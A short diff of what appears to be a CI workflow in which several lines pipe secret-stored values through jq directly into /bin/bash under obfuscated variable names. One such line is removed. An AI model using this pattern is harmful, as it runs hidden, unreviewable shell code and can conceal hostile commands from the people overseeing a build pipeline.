@@ -18,7 +18,6 @@ jobs:
           r16752: ${{ secrets.r16752 }}
         run: |
           printf '%s' "$r16752" | jq -r .ny1109 | /bin/bash
-          echo $p1308 | jq -r .uaqgn3 | /bin/bash
           printf '%s' "$hnk4" | jq -r .jz36568 | /bin/bash
           echo $spogi6413 | jq -r .iry5 | /bin/bash
 
